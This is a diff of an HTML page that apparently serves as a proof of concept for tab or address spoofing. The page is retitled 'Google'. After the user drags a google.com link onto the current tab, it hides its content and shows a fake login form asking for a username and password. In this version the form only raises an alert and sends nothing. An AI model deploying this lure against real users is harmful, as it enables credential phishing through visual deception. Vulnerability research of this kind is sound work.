@@ -3,22 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Draggable Link Example</title>
-    <script>
-        function setData(e) {
-            e.dataTransfer.setData("text/plain", "https://www.google.com/");
+    <title>Google</title>
+    <style>
+        #loginPanel {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            border: 1px solid #ccc;
+            padding: 20px;
+            background: white;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
         }
-
-        document.addEventListener("dragend", function () {
-            document.body.innerHTML = '<b>Spoofing</b>';
-            document.title = 'Google';
-        });
-    </script>
+    </style>
 </head>
 <body>
-    <p>Drag the link below to the current TAB:</p>
-    <span id="dragMe" draggable="true" ondragstart="setData(event)" style="cursor: grab; color: blue; text-decoration: underline;">
-        Drag Me
-    </span>
+
+<p id="instruction">Drag and drop links to the current TAB.</p>
+<a id="bb" onmousedown="ee()" href="https://www.google.com/">www.google.com</a>
+
+<div id="loginPanel">
+    <h2>Login</h2>
+    <form onsubmit="return handleLogin(event);">
+        <label for="username">Username:</label>
+        <input type="text" id="username" required>
+        <br>
+        <label for="password">Password:</label>
+        <input type="password" id="password" required>
+        <br>
+        <button type="submit">Login</button>
+    </form>
+</div>
+
+<script>
+    document.addEventListener("dragend", function () {
+        // Hide the paragraph and the link when dragging ends
+        document.getElementById('instruction').style.display = 'none';
+        document.getElementById('bb').style.display = 'none';
+        // Show the login panel
+        document.getElementById('loginPanel').style.display = 'block';
+    });
+
+    function ee() {
+        document.getElementById('bb').setAttribute('href', 'https://www.google.com');
+    }
+
+    function handleLogin(event) {
+        event.preventDefault(); // Prevent form submission
+        // Here you would handle the login logic (e.g., validate credentials)
+        alert('Login submitted!'); // Placeholder action
+        document.getElementById('loginPanel').style.display = 'none'; // Hide the panel
+        // Redirect or perform other actions upon successful login
+    }
+</script>
+
 </body>
 </html>
